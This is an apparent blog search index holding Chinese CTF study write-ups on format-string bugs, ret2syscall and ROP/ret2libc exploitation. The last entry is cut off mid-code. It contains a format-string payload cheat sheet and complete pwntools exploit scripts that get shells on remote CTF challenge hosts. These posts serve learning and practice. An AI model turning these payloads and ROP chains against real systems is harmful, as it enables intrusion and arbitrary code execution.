<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pwn——格式化字符串漏洞初尝试</title>
    <link href="/2023/09/21/Pwn%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
    <url>/2023/09/21/Pwn%E2%80%94%E2%80%94%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h2 id="格式化字符串漏洞基础"><a href="#格式化字符串漏洞基础" class="headerlink" title="格式化字符串漏洞基础"></a>格式化字符串漏洞基础</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>成因在于像printf&#x2F;sprintf&#x2F;snprintf等格式化打印函数都是接受可变参数的，而一旦程序编写不规范，比如正确的写法是：printf(“%s”, pad)，偷懒写成了：printf(pad)，此时就存在格式化字符串漏洞。</p><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><ul><li>通过输入字符串计算偏移量</li></ul><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">32</span>位<br><br>aaaa <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span>...<br><br><span class="hljs-number">64</span>位<br><br>aaaaaaaa <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span> <span class="hljs-variable">%08</span><span class="hljs-keyword">x</span>...<br></code></pre></td></tr></table></figure><p><img src="/images/pwn9-1.png"></p><p>如图所示偏移量应该为11.</p><ul><li>利用找到的偏移，在偏移处填入目的地址可以实现目的地址的内容泄露以及内容改写。</li></ul><p><strong>找到的偏移如何用？</strong><br>例如，以32位程序为例，构造payload：p32(system_got)+b”%11$s”，此时system的got表地址会存在栈上，也就是printf的第11个参数位置；而%11$s表示打印出第11个参数作为地址指向的内容，所以此时该payload就会打印出system的真实地址。再构造payload：p32(system_got)+b”%11$n”，%11$n表示往第11个参数指向的内存中写4个字节宽的内容，而写的数值是print已经打印的内容长度，printf此时打印的长度是p32(system_got)的长度，也就是4，所以此时该payload就会改写system真实地址为4。</p><h3 id="常用payload总结-还不能完全理解，先放在这里，边刷题边理解吧"><a href="#常用payload总结-还不能完全理解，先放在这里，边刷题边理解吧" class="headerlink" title="常用payload总结(还不能完全理解，先放在这里，边刷题边理解吧)"></a>常用payload总结(还不能完全理解，先放在这里，边刷题边理解吧)</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br><br># 格式化符号说明<br>%x 以十六进制打印，只能打印<span class="hljs-number">4</span>字节，一般只用于<span class="hljs-number">32</span>位<br>%p 打印目标地址，建议<span class="hljs-number">32</span>位和<span class="hljs-number">64</span>位都用这个<br>%s 打印地址内容<br>%c 打印单个字符<br>%hhn 写一字节<br>%hn  写两字节<br>%n   写四字节<br>%ln  <span class="hljs-number">32</span>位写四字节，<span class="hljs-number">64</span>位写八字节<br>%lln 写八字节<br><br>#################### <span class="hljs-number">32</span>位<br># 求偏移<br>pad = <span class="hljs-string">&quot;aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...&quot;</span><br><br># 泄露目标地址内容，假设偏移为offset<br>## 目标地址放前面<br>pad = p32(target_addr)+<span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>## 目标地址放后面<br>pad = <span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset+<span class="hljs-number">1</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)+p32(target_addr)<br><br># 改写目标地址内容为value<br>## 目标地址放前面<br>pad = p32(target_addr)+<span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$n&quot;</span>.format(value<span class="hljs-number">-4</span>, offset).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>## 目标地址放后面，注意ljust补位的字符和offset+idx的位置要对应<br>pad = <span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$n&quot;</span>.format(value, offset+<span class="hljs-number">3</span>).ljust(<span class="hljs-number">4</span>*<span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>pad += p32(target_addr)<br>#################### <br><br>#################### <span class="hljs-number">64</span>位<br># 求偏移<br>pad = <span class="hljs-string">&quot;aaaaaaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...&quot;</span><br><br># 泄露目标地址内容，目标地址只能放后面，假设偏移为offset<br>pad = <span class="hljs-string">&quot;%&#123;&#125;$s&quot;</span>.format(offset+<span class="hljs-number">1</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)+p64(target_addr)<br><br># 改写目标地址内容为value<br>## 目标地址只能放后面，注意ljust补位的字符和offset+idx的位置要对应<br>pad = <span class="hljs-string">&quot;%&#123;&#125;c%&#123;&#125;$lln&quot;</span>.format(value, offset+<span class="hljs-number">3</span>).ljust(<span class="hljs-number">8</span>*<span class="hljs-number">3</span>, <span class="hljs-string">&quot;a&quot;</span>).encode(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br>pad += p64(target_addr)<br>#################### <br><br></code></pre></td></tr></table></figure><h2 id="例题-BUUCTF-jarvisoj-fm"><a href="#例题-BUUCTF-jarvisoj-fm" class="headerlink" title="例题 (BUUCTF jarvisoj_fm)"></a>例题 (BUUCTF jarvisoj_fm)</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>例行检查，32位，开启了canary和nx保护。</p><p>ida查看代码，</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [esp+2Ch] [ebp-5Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+7Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">be_nice_to_people</span>();<br>  <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(buf));<br>  <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x50</span>u);<br>  <span class="hljs-built_in">printf</span>(buf);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d!\n&quot;</span>, x);<br>  <span class="hljs-keyword">if</span> ( x == <span class="hljs-number">4</span> )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;running sh...&quot;</span>);<br>    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在后门函数，printf(buf)属于格式化字符串漏洞。<br>程序大致意思就是要使x&#x3D;4，那么就能执行shell啦。</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><ul><li>计算偏移量</li></ul><p>根据步骤，我们先根据输入计算偏移量。</p><p>上面讲基础时的那张图就是这道题的偏移量计算过程。因此偏移量为11</p><ul><li>构造payload</li></ul><p>我们的目的是将x的值改为4，x的地址通过双击可以找到为0x0804A02C，可以构造payload</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">payload</span>=p32(x_addr)+<span class="hljs-string">&quot;%11$n&quot;</span><br></code></pre></td></tr></table></figure><p>首先传入x参数的地址，这个地址存放在栈上偏移为11的位置，利用%11$n，定位到了偏移为11的位置,往这个位置写入数据，写入的数据由%11$n前面的参数的长度决定，而x参数的地址正好是4位，不需要添a来补齐位数就可以直接利用，将x参数的地址的值改成了4，从而获取了shell</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node3.buuoj.cn&#x27;,25582)<br><span class="hljs-attribute">x_addr</span>=0x804A02C<br><br><span class="hljs-attribute">payload</span>=p32(x_addr)+b&quot;%11$n&quot;<br><br>r.sendline(payload)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>根据上面整理的那种写法，payload也可以这样写：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-built_in">p32</span>(x_addr)+<span class="hljs-string">&quot;%&#123;&#125;$n&quot;</span><span class="hljs-selector-class">.format</span>(<span class="hljs-number">11</span>)<span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>)<br></code></pre></td></tr></table></figure><p>通过这个简单的题目来理解一下格式化字符串漏洞，之后遇到更难的题目继续整理~</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li>格式化字符串漏洞的形式</li><li>利用该漏洞的步骤（注意32&#x2F;64位的区别）</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ret2syscall</title>
    <link href="/2023/09/20/Pwn%E2%80%94%E2%80%94ret2syscall/"/>
    <url>/2023/09/20/Pwn%E2%80%94%E2%80%94ret2syscall/</url>
    
    <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>控制程序执行系统调用，获取 shell</p><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><p>如果没有system和开启了NX（栈不可执行）保护可以用（有system最好用ret2text，方便省事，没开NX直接ret2shellcode）</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><p>32位和64位的syscall原理都是一样，只有传参和调用存在差异，以下一起说，做个对比。</p><ul><li>32位系统调用使用 “ int 80h “</li><li>64位系统调用使用 “ syscall “ （汇编代码就是syscall 直接ROPgadget–only查找即可）</li></ul><p>32的系统调用号与64位的不大一样 使用的时候最好百度一下</p><ul><li>32位     #define __NR_execve 11</li><li>64位     #define __NR_execve 59   （0x3b）</li></ul><p>32位的系统调用号放在eax 传参依次是 <strong>EBX、ECX、EDX、ESI、EDI、EBP</strong><br>64位的系统调用号放在rax 传参依次是 <strong>RDI、RSI、RDX、R10、R8、R9</strong>  （和64位函数传参一样）</p><p><strong>构造ROP chain:</strong></p><ul><li>没有&#x2F;bin&#x2F;sh字眼 只能自己加到bss区域，然后调用execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)</li></ul><p>查找bss：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">readelf</span> -S pwn  <br>或<br>gdb中使用vmmap<br></code></pre></td></tr></table></figure><p><img src="/images/pwn7-1.png"></p><p>例如上图中这一段有w（可写）权限的地址应该都可以。</p><ul><li>有&#x2F;bin&#x2F;sh，溢出成功后，通过寻找特定的寄存器，以寄存器承载特定的数据，构造 execve(“&#x2F;bin&#x2F;sh”,NULL,NULL) 的汇编实现，将其部署栈中，劫持控制流实现获取 shell。</li></ul><p>如何构造汇编实现？(64bit)</p><pre><code class="hljs">    execve(&quot;/bin/sh&quot;,NULL,NULL)    系统调用号，rax为59    第一个参数，rdi指向/bin/sh    第二个参数，为0    第三个参数，为0    第四个参数，为0    第五个参数，rsi为0    payload = &quot;A&quot;*offset(偏移量) + flat(rdi,bin_sh,rax_rdx_rbx,59,0,0,rsi,0,syscall)</code></pre><p>查找各寄存器地址：</p><pre><code class="hljs">    ROPgadget --binary ret2syscall --only &quot;syscall|ret&quot;    ROPgadget --binary ret2syscall --only &#39;pop|ret&#39; | grep &#39;rdx&#39;    #rdx=0x000000000040168b    </code></pre><h2 id="例题（https-oj-blue-whale-me-challenges-pwnalpha）"><a href="#例题（https-oj-blue-whale-me-challenges-pwnalpha）" class="headerlink" title="例题（https://oj.blue-whale.me/challenges#pwnalpha）"></a>例题（<a href="https://oj.blue-whale.me/challenges#pwnalpha%EF%BC%89">https://oj.blue-whale.me/challenges#pwnalpha）</a></h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>开启了NX保护，64位</p><p>nc一下：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs applescript">nc vps1.blue-whale.<span class="hljs-keyword">me</span> <span class="hljs-number">19900</span>                             <br>Hello brave new challenger<br>Any <span class="hljs-keyword">last</span> <span class="hljs-built_in">words</span>?<br>lll<br>This will be <span class="hljs-keyword">the</span> <span class="hljs-keyword">last</span> thing <span class="hljs-keyword">that</span> you <span class="hljs-built_in">say</span>: lll<br><br>Alas, you had no luck today.<br></code></pre></td></tr></table></figure><p>从键盘输入，然后再输出。</p><p>拖进ida64看看，</p><p>这里打开ida以后出现了好多好多函数，但是没有main函数，想要快速找到主要函数可以查看String窗口并查找“Any last words”字符串，双击查看这个字符串是由什么函数使用的。用这个方法找到是sub_400B60()这个函数，f5看看这个函数的内容。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">__int64 __fastcall sub<span class="hljs-constructor">_400B60(<span class="hljs-params">__int64</span> <span class="hljs-params">a1</span>, <span class="hljs-params">signed</span> <span class="hljs-params">__int64</span> <span class="hljs-params">a2</span>)</span><br>&#123;<br>  <span class="hljs-built_in">char</span> buf; <span class="hljs-comment">// [rsp+0h] [rbp-400h]</span><br><br>  sub<span class="hljs-constructor">_410390((<span class="hljs-params">signed</span> <span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;Any last words?&quot;</span>, a2);<br>  sub<span class="hljs-constructor">_4498A0(0, &amp;<span class="hljs-params">buf</span>, 0x7D0uLL)</span>;<br>  return sub<span class="hljs-constructor">_40F710((<span class="hljs-params">__int64</span>)</span><span class="hljs-string">&quot;This will be the last thing that you say: %s\n&quot;</span>, &amp;buf);<br>&#125;<br></code></pre></td></tr></table></figure><p>buf存在栈溢出。</p><p>再查看一下sub_4498A0(),发现其系统调用read函数</p><p><img src="/images/pwn7-2.png"></p><p>根据分析，知道read函数这里产生了栈溢出，根据read知道，会用到系统调用。这里开启了NX保护，不能直接往栈里写shellcode，可以通过系统调用execave函数来获得shell。即在返回地址处进行系统调用，来执行execave（’&#x2F;bin&#x2F;sh’，0，0）命令来获得shell。</p><p>根据上面总结的基础知识，execave的第一个参数（’&#x2F;bin&#x2F;sh’）放在rdi中，第二个和第三个参数0需放在rsi,rdx。系统调用号（59）存放在rax中 .</p><p>利用ROPgadget 分别查找pop_rdi，pop_rsi,pop_rdx，pop_raxd的地址。</p><p>由于程序中不存在“&#x2F;bin&#x2F;sh”,在这里需要用read函数将’&#x2F;bin&#x2F;sh’写入一个可写可执行段.bss段，根据上面提到的方法查找bss段。</p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload=<span class="hljs-attribute">padding</span> + <span class="hljs-built_in">read</span>(<span class="hljs-number">0</span>,bss_addr,<span class="hljs-built_in">len</span>(‘/bin/sh\x00’)) + sysread_id + syscall_addr +<span class="hljs-built_in">execave</span>(bss_addr,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) + sysexecave_id +syscall_addr<br></code></pre></td></tr></table></figure><p>可以与下面exp对照来看。</p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs smali">from pwn import *<br><br>r = remote(&#x27;vps1.blue-whale.me&#x27;,19900)<br><br>pop_rdi=0x0000000000400686<br>pop_rsi=0x00000000004101f3<br>pop_rdx=0x00000000004498b5<br>pop_rax=0x0000000000415664<br>syscall_addr = 0x0000000000474E65<br>bss_addr = 0x00000000006bb2e0<br><br>payload = b&#x27;a&#x27;*0x400 + b&#x27;b&#x27;*0x8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(8) + p64(pop_rax) + p64(0) + p64(syscall_addr)<br><br>payload += p64(pop_rdi) + p64(bss_addr) + p64(pop_rsi) + p64(0) +p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(59) + p64(syscall_addr)<br><br>r.send(payload)<br>r.send(&#x27;/bin/sh\x00&#x27;)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>这里p64(pop_rax) + p64(0)应该对应的是read系统调用号。p64(pop_rax) + p64(59)对应64位程序系统调用号</p><p>附上系统调用号连接：<a href="https://filippo.io/linux-syscall-table/">https://filippo.io/linux-syscall-table/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Pwn——ROP进阶练习</title>
    <link href="/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/"/>
    <url>/2023/09/18/Pwn%E2%80%94%E2%80%94ROP%E8%BF%9B%E9%98%B6%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="例题（BUUCTF-OGeek2019-babyrop）"><a href="#例题（BUUCTF-OGeek2019-babyrop）" class="headerlink" title="例题（BUUCTF [OGeek2019]babyrop）"></a>例题（BUUCTF [OGeek2019]babyrop）</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p><img src="/images/pwn5-1.png"></p><p>没有canary保护，nx保护开启排除shellcode可能性，FULL RELEO为地址随机化。</p><p>拖到ida观察，main函数中生成一个随机数，把这个随机数读入buf，buf作为参数传进sub_804871F()函数里，然后将该函数返回的结果作为参数再传进sub_80487D0()里</p><p>未发现system，binsh<br><img src="/images/pwn5-2.png"></p><p><strong>f2函数：</strong><br><img src="/images/pwn5-3.png"></p><p>终端输入0x20字节长的字符串到buf，buf数组长度为7，可以发生溢出，但溢出不到ret位置。<br>strcmp的特性是遇到’\0’就停止比较字符串，这里可以考虑0截断绕过。<br>最后函数把v5作为返回值。但是这个函数并没有对v5做出改动，结合栈图，可以猜测v5是被溢出改变了。</p><p><strong>f3函数：</strong></p><p><img src="/images/pwn5-4.png"><br>f3函数是把v5的值作为参数传入，进行条件判断运算。在第2个read中，只要a1足够大，就能发生栈溢出，并且能够溢出到ret位置。</p><p>这里的a1是上一个函数的返回值，看v5的地址，可以看到就在buf的地址里，我们只要在读入buf的时候将这个位置填上255（\xff），之后就会执行else，那么我们就可以对buf进行溢出了<br>buf数组长度为0x2c-0x25&#x3D;0x7</p><p><img src="/images/pwn5-5.png"></p><p>所以第一个payload为：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload1</span> = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(<span class="hljs-number">0</span>x2c-<span class="hljs-number">0</span>x25)<br></code></pre></td></tr></table></figure><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul><li>经过上面分析，找出了两个可以栈溢出的点。f3函数能让第二个read栈溢出成功的前提是传入的a1足够大，而v5就是a1。若要让v5足够大，在f2中必须溢出改变v5的值。若要能让f2成功返回v5，必须使用零截断绕过strncmp函数。</li><li>题目没有给出后门函数，这个二进制文件不是静态的，可以利用的gadget也不多。所以考虑使用retl2ibc构造system(“&#x2F;bin&#x2F;sh”)函数，这里利用write函数作为中间跳板获得其他函数的真实值。</li></ul><p>第二个payload主要对f3中的buf进行溢出，泄露libc地址</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload2=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">write_plt</span>)+p32(<span class="hljs-name">main</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">write_got</span>)+p32(<span class="hljs-number">4</span>)<br></code></pre></td></tr></table></figure><p>之后可以计算偏移量，构造rop。在这里我用题目给的libc文件打不通，并且main函数地址不能用elf.sym[“main”]，我也不知道为啥。最后还是用的LibcSearcher</p><p>第三个payload：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">payload3=b&#x27;a&#x27;*(<span class="hljs-number">0</span>xe7+4)+p32(<span class="hljs-name">system_addr</span>)+p32(<span class="hljs-number">0</span>)+p32(<span class="hljs-name">bin_sh</span>)<br></code></pre></td></tr></table></figure><h3 id="完整exp："><a href="#完整exp：" class="headerlink" title="完整exp："></a>完整exp：</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br><span class="hljs-keyword">from</span> LibcSearcher import *<br><br><span class="hljs-attribute">r</span>=remote(&#x27;node4.buuoj.cn&#x27;,28508)<br><span class="hljs-attribute">elf</span>=ELF(&#x27;./pwn&#x27;)<br><span class="hljs-comment">#libc=ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main = 0x08048825<br><br>payload1 = b<span class="hljs-string">&quot;\x00&quot;</span> + b<span class="hljs-string">&quot;\xff&quot;</span>*(0x2c-0x25)<br>r.sendline(payload1)<br>r.recvuntil(b<span class="hljs-string">&quot;Correct\n&quot;</span>)<br><br><span class="hljs-attribute">payload2</span>=b&#x27;a&#x27;*(0xe7+4)+p32(write_plt)+p32(main)+p32(0)+p32(write_got)+p32(4)<br>r.sendline(payload2)<br><span class="hljs-attribute">write_addr</span>=u32(r.recv(4))<br><br><br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">offset</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">system_addr</span>=offset+libc.dump(&#x27;system&#x27;)<br><span class="hljs-attribute">bin_sh</span>=offset+libc.dump(&#x27;str_bin_sh&#x27;)<br><br>r.sendline(payload1)     #第二次发送payload1<br><br><span class="hljs-attribute">payload3</span>=b&#x27;a&#x27;*(0xe7+4)+p32(system_addr)+p32(0)+p32(bin_sh)<br><br>r.sendline(payload3)<br>r.interactive()<br><br></code></pre></td></tr></table></figure><p>这里payload1是上传了两遍的，一开始没发现，导致卡了很久。。菜死我了orz</p><h2 id="例题2-（BUUCTF-bjdctf-2020-babyrop）"><a href="#例题2-（BUUCTF-bjdctf-2020-babyrop）" class="headerlink" title="例题2 （BUUCTF bjdctf_2020_babyrop）"></a>例题2 （BUUCTF bjdctf_2020_babyrop）</h2><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>checksec，发现开了NX，是个64位程序。</p><p>拖到ida64，很简单一程序。</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-built_in">int</span> __<span class="hljs-function">cdecl <span class="hljs-title">main</span>(<span class="hljs-params"><span class="hljs-built_in">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-built_in">char</span> **envp</span>)</span><br>&#123;<br>  <span class="hljs-keyword">init</span>(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span 